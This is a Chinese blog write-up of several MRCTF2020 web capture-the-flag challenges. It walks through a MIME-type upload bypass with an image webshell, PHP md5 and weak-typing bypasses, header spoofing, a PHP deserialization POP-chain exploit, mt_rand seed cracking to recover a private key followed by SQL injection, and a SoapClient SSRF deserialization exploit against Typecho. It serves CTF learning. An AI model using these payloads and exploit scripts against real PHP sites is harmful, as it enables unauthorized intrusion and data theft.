---
title: '[MRCTF2020]套餐'
date: 2020-10-06 20:52:58
---

<!-- TOC -->

- [[MRCTF2020]你传你🐎呢](#mrctf2020你传你🐎呢)
- [[MRCTF2020]Ez_bypass](#mrctf2020ez_bypass)
- [[MRCTF2020]PYWebsite](#mrctf2020pywebsite)
- [[MRCTF2020]Ezpop](#mrctf2020ezpop)
- [[MRCTF2020]套娃](#mrctf2020套娃)
- [[MRCTF2020]Ezaudit](#mrctf2020ezaudit)
- [MRCTF2020]Ezpop_Revenge](#mrctf2020ezpop_revenge)

<!-- /TOC -->

<!--more-->
---
# [MRCTF2020]你传你🐎呢
> .htaccess解析，MIME绕过

上传题，随便传个试试，在那之前，欣赏一下祖安出题人
![start](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.ye0rf4py2y.png)
![upload1](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.9h5rncyv4ew.png)
上传都是这。。。看看用的啥服务，随便弄一个不存在的页面
![apache](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.nv7djrc4d5.png)
既然是apache，那就试试有没有解析漏洞，传一个`.htaccess`，失败。\
MIME类型验证绕过,修改Content-type为：image/jpeg，成功
![.htaccess](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.oc2phdb19p.png)
在传一个图片马，蚁剑连接
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.n70pw5jx1mb.png)

---
# [MRCTF2020]Ez_bypass
>简单弱类型绕过

给了源码：
```php
<?php
//I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
?>
```
简单的绕过，一共两关\
- 第一关：md5判断绕过\
md5不能处理数组，传两个数组就好，payload：`?id[]=1&gg[]=2`
- 第二关：php弱类型判断\
```php
if (!is_numeric($passwd))
    if($passwd==1234567)
```
passwd既要不是数字又要等于1234567，所以可以在数字最后加上一个字母来绕过is_numeric()函数，php在进行弱判断时会把两边变量统一，所以1234567x就变成了1234567
最后payload：`GET：?id[]=1&gg[]=2`，`POST：passwd=1234567x`

---
# [MRCTF2020]PYWebsite
>XFF伪造

让买flag，~~公开py~~，看看源码有一段js，会跳转到flag.php，直接进去看看
![index.php](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.xc0pkk2kfs.png)
![flag.php](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b041j8yb8bp.png)
注意，他说只有购买者和自己能看到，这说明可能XFF可能有效，去试试XFF或者client-ip
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.hvt3lc7c2a8.png)

---
# [MRCTF2020]Ezpop
>构造pop反序列化链\
第一次做pop，参考了许多wp，自己太菜，也研究了好久，参考链接：\
https://www.jianshu.com/p/40ab1c531fcc
https://www.jianshu.com/p/150cb693f77b
https://www.gem-love.com/ctf/2184.html#Ezpop

给了源码：
```php
 <?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 
```
给了个网站，关于反序列化的魔术方法的，不过链接挂了，做题之前先了解一下什么是魔术方法
>PHP中把以两个下划线_开头的方法称为魔术方法(Magic methods)

>常见的16种如下：
>
>1. __construct()，类的构造函数
>2. __destruct()，类的析构函数
>3. __call()，在对象中调用一个不可访问方法时调用
>4. __callStatic()，用静态方式中调用一个不可访问方法时调用
>5. __get()，获得一个类的成员变量时调用
>6. __set()，设置一个类的成员变量时调用
>7. __isset()，当对不可访问属性调用isset()或empty()时调用
>8. __unset()，当对不可访问属性调用unset()时被调用。
>9. __sleep()，执行serialize()时，先会调用这个函数
>10. __wakeup()，执行unserialize()时，先会调用这个函数
>11. __toString()，类被当成字符串时的回应方法
>12. __invoke()，以调用函数的方式调用一个对象时的回应方法
>13. __set_state()，调用var_export()导出类时，此静态方法会被调用。
>14. __clone()，当对象复制完成时调用
>15. __autoload()，尝试加载未定义的类
>16. __debugInfo()，打印所需调试信息

pop反序列化链，自己理解就是不能直接利用某个类里面的方法，但是可以使用其它类来间接利用，也就构成链\
这个题也就三个类，最长就是三个链，分析各类，构造pop链\
1、`Modifier`类
```php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
```
里面有个include，应该可以包含flag.php读取源码，下面的`__invoke`魔术方法是以调用函数的方式调用一个对象时会自动调用此魔术方法，哪里有这样的调用方式呢，最下面的`__get`方法，就调用了，接着分析\
2、`Test`类
```php
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
```
`__get`魔术方法将`p`作为函数调用，如果将`p`实例化为`Modifier`那就会调用此类里的`__invoke`魔术方法，达到目的，怎么触发`__get`魔术方法？在获得一个类的成员变量时会调用`__get`(即使该成员不存在)，再看看主类\
3、`Show`类
```php
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
```
`__construct`构造，默认读取index.php\
`__toString`，类被当成字符串时调用此方法\
`__wakeup`，反序列化时调用，万万没想到这个题的__wakeup是利用的不是让绕过的，其实过滤的也没啥，阻止不了读源码。\
方法分析完看看怎么构造链子，在`__wakeup`方法中用了`preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)`去过滤`$this->source`中的敏感字眼，但是如果`$this->source`是`Show`的话，就会自动调用`__toString`方法，如果`$this->source`是`Test`类的话，`__toString`访问不到`source`属性，就会调用`__get`方法。

4、总结一下
pop链的开始是`Show`类，使用反序列化去触发`__wakeup`魔术方法，`__wakeup`触发`__toString`，然后访问不存在的`source`属性，触发`Test`类里的`__get`方法，`__get`再以访问函数的形式访问一个类去触发`Modifier`类里的`__invoke`方法，此方法再调用`append`函数，完成flag.php的读取\
exp如下:
```php
<?php
class Modifier {
    protected  $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Show{
    public $source;
    public $str;
    public function __construct($file){
        $this->source = $file;
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }
}
$a = new Show('a');
$a->str = new Test();
$yq1ng = new Show($a);
echo(urlencode(serialize($yq1ng)));
?>
```
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.g80kpq08xie.png)

---
# [MRCTF2020]套娃
>php字符简单bypass，简单脚本逆向

## 第一关
进题目就是一张大大的北邮图片，源码给了第一关的源码
```php
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
 }
```
不能提交`_`或者其url编码`%5f`，但是下面GET的变量`b_u_p_t`却有三个`_`，变量值需要是`23333`但是后面有匹配不让是`23333`。。。\
绕过：在`[BJDCTF2020]EzPHP`里也提到过，`QUERY_STRING`是不会解码的，但是if里面也过滤了`%5f`所以并不能直接编码绕过，在[这篇文章](https://www.freebuf.com/articles/web/213359.html)里面介绍了一些字符bypass
- `b.u.p.t`  （点代替_）
- `b u p t`  （空格代替_）
![bypass1](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.wc223psyehp.png)
![bypass2](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.pvcfiked48.png)
换行污染字符串匹配可参考`[BJDCTF2020]EzPHP`\
payload：`?b u p t=23333%0a`\
得到提示`FLAG is in secrettw.php `
## 第二关
```
Flag is here~But how to get it?Local access only!
Sorry,you don't have permission! Your ip is :sorry,this way is banned! 
```
XFF伪造，没成功。。一股脑把三个伪造都上了，成了。注释有JSFUCK，直接浏览器控制台输入JSFUCK可以解码，让Post me Merak
![ip](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.cm0rdkho5jv.png)
![jsfuck](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kkr3mq3pb5.png)
给了源码：
```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 

function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>  
```
对于最后的`file_get_contents($_GET['2333']) === 'todat is a happy day' )`可以使用`data`协议绕过，`change`函数写一个解密脚本，如下
```php
<?php
function change($v){
    $v = base64_decode($v);
    $re = '';
    for($i=0;$i<strlen($v);$i++){
        $re .= chr ( ord ($v[$i]) + $i*2 );
    } 
    return $re;
}
function dechange($v){
    $re = '';
    for ($i=0; $i < strlen($v); $i++) {
        $re .= chr ( ord ($v[$i]) - $i*2 );
    }
    echo(base64_encode($re)."\n");
    return $re;
}
$a = dechange('flag.php');
?>
```
payload：`?2333=data://text/plain,todat is a happy day&file=ZmpdYSZmXGI=`
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.6hxto886cvh.png)

---
# [MRCTF2020]Ezaudit
>伪随机数漏洞，简单sql\
第一次做伪随机数，不是很顺利哈哈

页面没看到啥有用的，扫了一波，有备份文件
![www.zip](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.h1r19jbypw7.png)
```php
<?php
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';';
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

}
// genarate public_key
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
```
公钥已经给我们了，要知道私钥就需要通过公钥算出来种子，在手工算出来私钥就好
>mt_rand()返回随机整数，随机就需要种子，`mt_scrand()`函数通过分发seed种子，使得mt_rand()生成随机数，这还是个伪随机数，可以通过暴力枚举找到种子\
我知道种子后，可以确定你输出伪随机数的序列。\
知道你的随机数序列，可以确定你的种子。  

此题已经给了随机数序列，用脚本算出种子
```python
str1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2='KVQP0LdJKRaV3n9D'#公钥
res=''
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res += str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```
得到：```36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61```\
再用php_mt_rand爆破，得到种子：1775196155
![seed](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.b3h60obpqfi.png)
再用种子去计算私钥
```php
<?php
mt_srand(1775196155);
// genarate public_key
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
}

//genarate private_key
function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
}
echo(public_key()."\n");
echo(private_key()."\n");
?>
```
得到私钥为`XuNhoueCDCGc`，sql语句给了，简单万能密码就能登陆
![login](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bd6zwpgpv4s.png)

---
# MRCTF2020]Ezpop_Revenge
>pop反序列化链，SSRF\
本题未完结，菜鸡看不懂wp，想了解的可以参考[Y1ng师傅](https://www.gem-love.com/ctf/2184.html#EzpopRevenge)

进去是一个Typecho博客，扫目录发现有www.zip源码泄露，下载看看，第一次做这种框架的（其实自己啥都没做过23333，显得自己厉害？略略略），参考[Y1ng师傅](https://www.gem-love.com/ctf/2184.html#EzpopRevenge)的
![www.zip](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.e75dv4fs9x.png)
参考之前想了一下自己的想法，不能那一道题都直接参考WP吧，嘤嘤嘤\
以下为自己瞎想的+师傅们的思路\
全局搜了一下`flag`想碰碰运气，搜到了两个有用的东西，一个假flag，另一个是flag.php
![search](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.kckhrj9qco9.png)
在flag.php中提示可能为SSRF
```php
<?php
if(!isset($_SESSION)) session_start();
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
   $_SESSION['flag']= "MRCTF{******}";
}else echo "我扌your problem?\nonly localhost can get flag!";
?>
```
Plugin.php中虽然是假flag，但是`HelloWorld_DB`类却有`__wakeup`函数，反序列化！整个脚本核心代码为：
```php
<?php
class HelloWorld_DB{
    private $flag="MRCTF{this_is_a_fake_flag}";
    private $coincidence;
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}
class HelloWorld_Plugin implements Typecho_Plugin_Interface
{
    public function action(){
    if(!isset($_SESSION)) session_start();
    if(isset($_REQUEST['admin'])) var_dump($_SESSION);
    if (isset($_POST['C0incid3nc3'])) {
        if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)
            unserialize(base64_decode($_POST['C0incid3nc3']));
        else {
            echo "Not that easy.";
        }
    }
}
?>
```
可以看到，`HelloWorld_DB`中的`__wakeup`实例化了一个`Typecho_Db`，一会可以跟进一下；下面这个类在没有设置session时会开启session，接受到`admin`参数时会输出session，并过滤了`C0incid3nc3`参数的一些RCE及特殊字符，过滤成功则反序列化`C0incid3nc3`，也需要跟进一下`action`函数\
先跟进一下`Typecho_Db`，在var\Typecho\Db.php，此脚本核心代码：
```php
<?php
class Typecho_Db{
    public function __construct($adapterName, $prefix = 'typecho_')
    {
        /** 获取适配器名称 */
        $this->_adapterName = $adapterName;

        /** 数据库适配器 */
        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;

        if (!call_user_func(array($adapterName, 'isAvailable'))) {
            throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");//__toString()
        }

        $this->_prefix = $prefix;

        /** 初始化内部变量 */
        $this->_pool = array();
        $this->_connectedPool = array();
        $this->_config = array();

        //实例化适配器对象
        $this->_adapter = new $adapterName();
    }
?>
```
第九行，字符串拼接`__wakeup`实例化的`coincidence['hello']`，类被当成字符串拼接，那就会调用某个类的`__toString`，且`$adapterName`可控，再搜，找到`var\Typecho\Db\Query.php`中定义了一大段，核心如下：
```php
class Typecho_Db_Query
{
    private static $_default = array(
        'action' => NULL,
        'table'  => NULL,
        'fields' => '*',
        'join'   => array(),
        'where'  => NULL,
        'limit'  => NULL,
        'offset' => NULL,
        'order'  => NULL,
        'group'  => NULL,
        'having'  => NULL,
        'rows'   => array(),
    );
    private $_sqlPreBuild;
    public function __toString()
    {
        switch ($this->_sqlPreBuild['action']) {
            case Typecho_Db::SELECT:
                return $this->_adapter->parseSelect($this->_sqlPreBuild);
            case Typecho_Db::INSERT:
                return 'INSERT INTO '
                . $this->_sqlPreBuild['table']
                . '(' . implode(' , ', array_keys($this->_sqlPreBuild['rows'])) . ')'
                . ' VALUES '
                . '(' . implode(' , ', array_values($this->_sqlPreBuild['rows'])) . ')'
                . $this->_sqlPreBuild['limit'];
            case Typecho_Db::DELETE:
                return 'DELETE FROM '
                . $this->_sqlPreBuild['table']
                . $this->_sqlPreBuild['where'];
            case Typecho_Db::UPDATE:
                $columns = array();
                if (isset($this->_sqlPreBuild['rows'])) {
                    foreach ($this->_sqlPreBuild['rows'] as $key => $val) {
                        $columns[] = "$key = $val";
                    }
                }

                return 'UPDATE '
                . $this->_sqlPreBuild['table']
                . ' SET ' . implode(' , ', $columns)
                . $this->_sqlPreBuild['where'];
            default:
                return NULL;
        }
    }
}
```
通过反序列化控制`$this->_sqlPreBuild['action']`为`SELECT`，师傅WP里说如果\$_sqlPreBuild['action']为'SELECT'就会触发$_adapter的parseSelect()方法；这个地方一直搞不懂，[这篇博客](https://reader-l.github.io/2020/09/14/SoapClinet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96SSRF%E5%AD%A6%E4%B9%A0/)给了不错的解释，`\$this->_adapter`也是可控的，只需要将其设置为`sopa`类即可\
POP链分析：\

- `HelloWorld_DB`类反序列化触发`__wakeup`魔术方法，`__wakeup`实例化`Typecho_Db`，并将`coincidence['hello']`作为此类构造函数的第一个参数

- 因PHP数组可以存储对象，如果`coincidence['hello']`实例化了`Typecho_Db`，而在构造函数中将其当成字符串那就会触发`__toString`魔术方法

- 在`__toString`方法中，如果`$this->_sqlPreBuild['action']`为`SELECT`就会触发`$this->_adapter->parseSelect($this->_sqlPreBuild)`，并控制私有变量`$_adapter`为`soap`类来本地访问`flag.php`

- 假如`$this->_adapter`实例化一个`SoapClient`类，再去调用一个不存在的`parseSelect`方法，就会触发`__call`魔术方法
  
- `__call`方法可以帮助我们SSRF

PHP 的 SOAP 扩展可以用来提供和使用 Web Services，该类的构造函数如下：
```public SoapClient::__call ( string $function_name , array $arguments )```
>第一个参数是用来指明是否是wsdl模式\
第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间\
![wsdl](https://raw.githubusercontent.com/yq1ng/blog/master/MRCTF2020/image.bbtbn5jwmaa.png)

本题类的private在反序列化时会变成不可见字符，此时需要将不可见的`%00`写成十六进制`\00`，贴上Y1ng师傅的exp：
```php
<?php
//www.gem-love.com
class Typecho_Db_Query
{
    private $_adapter;
    private $_sqlPreBuild;

    public function __construct()
    {
        $target = "http://127.0.0.1/flag.php";
        $headers = array(
            'X-Forwarded-For:127.0.0.1',
            "Cookie: PHPSESSID=v456n8hvl1h5s7b7ihjnb03163"
        );
        $this->_adapter = new SoapClient(null, array('uri' => 'aaab', 'location' => $target, 'user_agent' => 'Y1ng^^' . join('^^', $headers)));
        $this->_sqlPreBuild = ['action' => "SELECT"];
    }
}

class HelloWorld_DB
{
    private $coincidence;
    public function __construct()
    {
        $this->coincidence = array("hello" => new Typecho_Db_Query());
    }
}

function decorate($str)
{
    $arr = explode(':', $str);
    $newstr = '';
    for ($i = 0; $i < count($arr); $i++) {
        if (preg_match('/00/', $arr[$i])) {
            $arr[$i - 2] = preg_replace('/s/', "S", $arr[$i - 2]);
        }
    }
    $i = 0;
    for (; $i < count($arr) - 1; $i++) {
        $newstr .= $arr[$i];
        $newstr .= ":";
    }
    $newstr .= $arr[$i];
    echo "www.gem-love.com\n";
    return $newstr;
}

$y1ng = serialize(new HelloWorld_DB());
$y1ng = preg_replace(" /\^\^/", "\r\n", $y1ng);
$urlen = urlencode($y1ng);
$urlen = preg_replace('/%00/', '%5c%30%30', $urlen);
$y1ng = decorate(urldecode($urlen));
echo base64_encode($y1ng);
```
不行了，不行了，肝了几天都看不懂，菜鸡暂时放弃，我会回来征服它的！
